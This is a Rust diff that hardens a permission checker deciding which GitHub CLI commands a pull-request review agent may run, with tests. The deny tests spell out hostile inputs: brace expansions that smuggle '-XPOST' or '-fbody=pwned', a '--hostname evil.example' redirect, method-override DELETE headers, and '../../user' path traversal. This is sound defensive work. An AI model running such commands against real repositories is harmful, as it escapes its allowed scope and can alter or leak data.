@@ -39,7 +39,7 @@ impl ReviewTarget {
         }
         let _kind = parts.next()?;
         let repo = parts.next()?;
-        let number = parts.next()?.parse::<u64>().ok()?;
+        let number = parse_number(parts.next()?)?;
         let (owner, name) = repo.split_once('/')?;
         if owner.is_empty() || name.is_empty() || name.contains('/') {
             return None;
@@ -69,7 +69,7 @@ pub fn instruction(policy: &ReviewPolicy) -> String {
     match (&policy.target, policy.results) {
         (Some(target), results @ (ReviewResults::Draft | ReviewResults::Post)) => {
             let mut text = format!(
-                "When your review is ready, post it with exactly: gh pr review {} --repo {} --comment --body \"<your review>\". Post nothing else, and do not change any files.",
+                "When your review is ready, post it with exactly: gh pr review {} --repo {} --comment --body '<your review>'. Write any apostrophe in the review as '\\''. Post nothing else, and do not change any files.",
                 target.number, target.repo
             );
             if results == ReviewResults::Draft {
@@ -83,9 +83,6 @@ pub fn instruction(policy: &ReviewPolicy) -> String {
 }
 
 pub fn verdict(policy: &ReviewPolicy, command: &str) -> Verdict {
-    if !is_single_command(command) {
-        return Verdict::Deny;
-    }
     let Some(words) = shlex::split(command) else {
         return Verdict::Deny;
     };
@@ -96,27 +93,32 @@ pub fn verdict(policy: &ReviewPolicy, command: &str) -> Verdict {
             Verdict::Deny
         };
     }
+    if !is_plain_command(command) {
+        return Verdict::Deny;
+    }
     let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
-    match args.as_slice() {
-        ["pr", "view" | "diff" | "checks" | "list", ..] => Verdict::Allow,
-        ["api", rest @ ..] => {
-            if api_is_read(rest) {
-                Verdict::Allow
-            } else {
-                Verdict::Deny
-            }
-        }
-        ["pr", "review", rest @ ..] => post(policy, rest, true),
-        ["pr", "comment", rest @ ..] => post(policy, rest, false),
-        _ => Verdict::Deny,
+    let target = policy.target.as_ref();
+    let allowed = match args.as_slice() {
+        ["pr", "view" | "diff" | "checks" | "list", rest @ ..] => pr_read(target, rest),
+        ["api", rest @ ..] => api_read(target, rest),
+        ["pr", "review", rest @ ..] => return post(policy, rest, true),
+        ["pr", "comment", rest @ ..] => return post(policy, rest, false),
+        _ => false,
+    };
+    if allowed {
+        Verdict::Allow
+    } else {
+        Verdict::Deny
     }
 }
 
-/// True when the shell would run `command` as one plain command: no chaining,
-/// pipes, redirection, substitution or variable expansion outside single
-/// quotes, and no newline outside quotes. Quoted `;`, `&`, `|`, `<`, `>` and
-/// newlines are plain text and fine.
-fn is_single_command(command: &str) -> bool {
+/// True when the shell would hand `command` to `gh` as exactly the words
+/// shlex sees. Outside quotes only a whitelist of characters is accepted, so
+/// no brace, glob, tilde, history, chaining, pipe, redirection, substitution or
+/// variable expansion can change the words. Single quotes are literal; double
+/// quotes may not contain `$` or a backtick. The one backslash allowed is
+/// `\'` (an apostrophe inside a single-quoted body written as `'\''`).
+fn is_plain_command(command: &str) -> bool {
     #[derive(PartialEq)]
     enum Quote {
         None,
@@ -144,73 +146,146 @@ fn is_single_command(command: &str) -> bool {
                 '\'' => quote = Quote::Single,
                 '"' => quote = Quote::Double,
                 '\\' => {
-                    chars.next();
+                    if chars.next() != Some('\'') {
+                        return false;
+                    }
                 }
-                ';' | '&' | '|' | '`' | '$' | '>' | '<' | '\n' | '\r' => return false,
-                _ => {}
+                c if c.is_ascii_alphanumeric() || "-_./:=,@+%# ".contains(c) => {}
+                _ => return false,
             },
         }
     }
     quote == Quote::None
 }
 
-/// `gh api` is a read when it is a GET with no request body.
-fn api_is_read(args: &[&str]) -> bool {
-    let mut method_given = false;
-    let mut has_body = false;
-    let mut iter = args.iter().copied().peekable();
+/// Digits only: rejects signs and anything `parse` would tolerate.
+fn parse_number(text: &str) -> Option<u64> {
+    if text.is_empty() || !text.bytes().all(|b| b.is_ascii_digit()) {
+        return None;
+    }
+    text.parse().ok()
+}
+
+fn same_repo(repo: &str, target: &ReviewTarget) -> bool {
+    repo.eq_ignore_ascii_case(&target.repo)
+}
+
+/// `gh pr view|diff|checks|list`: reads, scoped to the target repo when there
+/// is one, and never `--web` or `--watch`.
+fn pr_read(target: Option<&ReviewTarget>, args: &[&str]) -> bool {
+    let mut repos: Vec<&str> = Vec::new();
+    let mut urls: Vec<&str> = Vec::new();
+    let mut iter = args.iter().copied();
     while let Some(arg) = iter.next() {
-        if arg == "graphql" || arg.ends_with("/graphql") {
-            return false;
-        }
-        let method = if let Some(value) = arg.strip_prefix("--method=") {
-            Some(value)
-        } else if arg == "--method" {
-            Some(iter.next().unwrap_or(""))
-        } else if arg.starts_with("--") {
-            if arg == "--field"
-                || arg == "--raw-field"
-                || arg == "--input"
-                || arg.starts_with("--field=")
-                || arg.starts_with("--raw-field=")
-                || arg.starts_with("--input=")
-            {
-                has_body = true;
-            }
-            None
-        } else if let Some(cluster) = arg.strip_prefix('-').filter(|c| !c.is_empty()) {
-            // Short flags, possibly clustered (`-XPOST`, `-iXGET`, `-fk=v`).
-            let mut found = None;
-            for (i, flag) in cluster.char_indices() {
-                match flag {
-                    'X' => {
-                        let rest = &cluster[i + 1..];
-                        found = Some(if rest.is_empty() {
-                            iter.next().unwrap_or("")
-                        } else {
-                            rest
-                        });
-                        break;
+        match arg {
+            "--web" | "--watch" | "-w" => return false,
+            "-R" | "--repo" => match iter.next() {
+                Some(value) => repos.push(value),
+                None => return false,
+            },
+            _ => {
+                if let Some(value) = arg.strip_prefix("--repo=") {
+                    repos.push(value);
+                } else if arg.starts_with("-R") {
+                    // Joined or `=` forms are not parsed; refuse rather than guess.
+                    return false;
+                } else if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 2 {
+                    // Clustered short flags could hide -R or -w.
+                    if arg.contains('R') || arg.contains('w') {
+                        return false;
                     }
-                    'f' | 'F' => {
-                        has_body = true;
-                        break;
-                    }
-                    _ => {}
+                } else if arg.starts_with("http") {
+                    urls.push(arg);
                 }
             }
-            found
-        } else {
-            None
-        };
-        if let Some(method) = method {
-            if !method.eq_ignore_ascii_case("GET") {
-                return false;
-            }
-            method_given = true;
         }
     }
-    !has_body || method_given
+    let Some(target) = target else {
+        return true;
+    };
+    let url_repo = |url: &str| -> Option<String> {
+        let path = url.strip_prefix("https://github.com/")?;
+        let parts: Vec<&str> = path.split('/').collect();
+        match parts.as_slice() {
+            [owner, name, "pull", n] if parse_number(n).is_some() => {
+                Some(format!("{owner}/{name}"))
+            }
+            _ => None,
+        }
+    };
+    let mut scoped = !repos.is_empty();
+    if !repos.iter().all(|r| same_repo(r, target)) {
+        return false;
+    }
+    for url in urls {
+        match url_repo(url) {
+            Some(repo) if same_repo(&repo, target) => scoped = true,
+            _ => return false,
+        }
+    }
+    scoped
+}
+
+/// `gh api` as a plain GET of an endpoint under the target repo. Every option
+/// that takes a value has it consumed; any option not listed denies.
+fn api_read(target: Option<&ReviewTarget>, args: &[&str]) -> bool {
+    let mut endpoint: Option<&str> = None;
+    let mut iter = args.iter().copied();
+    let header_ok = |value: &str| !value.to_ascii_lowercase().contains("method-override");
+    while let Some(arg) = iter.next() {
+        match arg {
+            "-X" | "--method" => {
+                if !iter.next().is_some_and(|m| m.eq_ignore_ascii_case("GET")) {
+                    return false;
+                }
+            }
+            "-H" | "--header" => {
+                if !iter.next().is_some_and(header_ok) {
+                    return false;
+                }
+            }
+            "--jq" | "-q" | "--cache" => {
+                if iter.next().is_none() {
+                    return false;
+                }
+            }
+            "--paginate" | "-i" | "--include" | "--silent" => {}
+            _ => {
+                if let Some(value) = arg.strip_prefix("--method=") {
+                    if !value.eq_ignore_ascii_case("GET") {
+                        return false;
+                    }
+                } else if let Some(value) = arg.strip_prefix("--header=") {
+                    if !header_ok(value) {
+                        return false;
+                    }
+                } else if arg.starts_with("--jq=") || arg.starts_with("--cache=") {
+                } else if arg.starts_with('-') || endpoint.replace(arg).is_some() {
+                    return false;
+                }
+            }
+        }
+    }
+    let Some(endpoint) = endpoint else {
+        return false;
+    };
+    let path = endpoint.strip_prefix('/').unwrap_or(endpoint);
+    let lower = path.to_ascii_lowercase();
+    if path.split('/').any(|seg| seg == "..")
+        || lower.contains("%2e")
+        || lower.contains("%2f")
+        || lower == "graphql"
+        || lower.ends_with("/graphql")
+    {
+        return false;
+    }
+    match target {
+        None => true,
+        Some(target) => {
+            let base = format!("repos/{}", target.repo);
+            lower == base || lower.starts_with(&format!("{base}/"))
+        }
+    }
 }
 
 /// The one write: a comment review (or plain comment) on the target pull
@@ -258,12 +333,12 @@ fn post(policy: &ReviewPolicy, args: &[&str], review: bool) -> Verdict {
         match parts.as_slice() {
             [owner, name, "pull", n] => {
                 selected_repo = Some(format!("{owner}/{name}"));
-                n.parse::<u64>().ok()
+                parse_number(n)
             }
             _ => None,
         }
     } else {
-        selector.parse::<u64>().ok()
+        parse_number(selector)
     };
     if number != Some(target.number) {
         return Verdict::Deny;
@@ -309,7 +384,8 @@ mod tests {
                 "gh pr checks 7 -R acme/app",
                 "gh pr list -R acme/app",
                 "gh api repos/acme/app/pulls/7/files",
-                "gh api --method GET repos/acme/app/pulls/7 -f per_page=100",
+                "gh api --method GET repos/acme/app/pulls/7 --paginate -q .title",
+                "gh api /repos/Acme/App/pulls/7 -H Accept:application/vnd.github.diff -i",
             ] {
                 assert_eq!(verdict(&policy(r), c), Verdict::Allow, "{r:?} {c}");
             }
@@ -434,6 +510,12 @@ mod tests {
             "gh api -XPATCH repos/acme/app",
             "gh api -XPOST repos/acme/app",
             "gh api --method GET graphql -f query=x",
+            "gh api --method GET repos/acme/app/pulls/7 -f per_page=100",
+            "gh api repos/acme/app --hostname evil.example",
+            "gh api repos/acme/app -H X-HTTP-Method-Override:DELETE",
+            "gh api repos/acme/app --header=x-http-method-override:PUT",
+            "gh api repos/acme/app --unknown",
+            "gh api repos/acme/app/../../user",
         ] {
             assert_eq!(verdict(&p, c), Verdict::Deny, "{c}");
         }
@@ -500,7 +582,8 @@ mod tests {
     #[test]
     fn instruction_names_the_exact_command_or_forbids_posting() {
         let i = instruction(&policy(ReviewResults::Draft));
-        assert!(i.contains("gh pr review 7 --repo acme/app --comment --body"));
+        assert!(i.contains("gh pr review 7 --repo acme/app --comment --body '"));
+        assert!(i.contains(r"Write any apostrophe in the review as '\''."));
         assert!(i.contains("The user approves the post"));
         let i = instruction(&policy(ReviewResults::Post));
         assert!(!i.contains("The user approves the post"));
@@ -511,5 +594,97 @@ mod tests {
             target: None,
         });
         assert!(i.contains("Do not post to GitHub"));
+    }
+
+    #[test]
+    fn shell_expansion_cannot_rewrite_the_words() {
+        let p = policy(ReviewResults::Post);
+        for c in [
+            "gh pr review 7 -R acme/app -c -b {x,--comment=false,-a}",
+            "gh pr comment 7 -R acme/app -b {x,-Revil/repo}",
+            "gh api repos/acme/app/issues/7/comments {-fbody=pwned,-XPOST}",
+            "gh api repos/acme/app {-XDELETE,}",
+            "gh api repos/acme/app ?XPOST",
+            "gh pr comment 7 -R acme/app -b ?Revil*",
+            "gh pr diff 7 -R acme/app [x]",
+            "gh pr view ~/x -R acme/app",
+            "gh pr view 7 -R acme/app (x)",
+            "gh pr view 7 -R acme/app !x",
+            "gh pr view 7 -R acme/app\tfoo",
+        ] {
+            assert_eq!(verdict(&p, c), Verdict::Deny, "{c}");
+        }
+    }
+
+    #[test]
+    fn reads_are_scoped_to_the_target_repo() {
+        let p = policy(ReviewResults::Gespan);
+        for c in [
+            "gh pr diff 7 -R other/repo",
+            "gh pr diff 7",
+            "gh pr view https://github.com/other/repo/pull/7",
+            "gh pr view 7 -R acme/app -R other/repo",
+            "gh pr view 7 -Rother/repo -R acme/app",
+            "gh pr view 7 -R acme/app --web",
+            "gh pr checks 7 -R acme/app --watch",
+            "gh pr view 7 -R acme/app -w",
+            "gh api repos/other/secret/contents/x",
+            "gh api repos/acme/application/pulls",
+            "gh api user",
+        ] {
+            assert_eq!(verdict(&p, c), Verdict::Deny, "{c}");
+        }
+        assert_eq!(
+            verdict(&p, "gh pr view https://github.com/acme/app/pull/7"),
+            Verdict::Allow
+        );
+        let open = ReviewPolicy {
+            results: ReviewResults::Gespan,
+            target: None,
+        };
+        assert_eq!(
+            verdict(&open, "gh api repos/other/secret/contents/x"),
+            Verdict::Allow
+        );
+        assert_eq!(verdict(&open, "gh pr diff 7 -R other/repo"), Verdict::Allow);
+        assert_eq!(verdict(&open, "gh pr diff 7 -R x/y --web"), Verdict::Deny);
+    }
+
+    #[test]
+    fn instructed_body_form_is_allowed() {
+        let c = r"gh pr review 7 --repo acme/app --comment --body 'Use `foo()`; costs $5 | it'\''s fine'";
+        assert_eq!(verdict(&policy(ReviewResults::Post), c), Verdict::Allow);
+        assert_eq!(verdict(&policy(ReviewResults::Draft), c), Verdict::Ask);
+        // A bare backslash elsewhere is still refused.
+        assert_eq!(
+            verdict(
+                &policy(ReviewResults::Post),
+                r"gh pr review 7 --repo acme/app --comment --body a\ b"
+            ),
+            Verdict::Deny
+        );
+    }
+
+    #[test]
+    fn numbers_are_digits_only() {
+        let p = policy(ReviewResults::Post);
+        assert_eq!(
+            verdict(&p, r#"gh pr review +7 -R acme/app --comment -b "x""#),
+            Verdict::Deny
+        );
+        assert_eq!(ReviewTarget::from_event_key("github:pr:acme/app:+7"), None);
+    }
+
+    #[test]
+    fn host_and_wrapper_spellings_stay_denied() {
+        let p = policy(ReviewResults::Post);
+        for c in [
+            "GH_HOST=x gh pr diff 7 -R acme/app",
+            "env gh pr diff 7 -R acme/app",
+            "/usr/bin/gh pr diff 7 -R acme/app",
+            "gh pr review 7 --repo github.com/acme/app --comment -b x",
+        ] {
+            assert_eq!(verdict(&p, c), Verdict::Deny, "{c}");
+        }
     }
 }
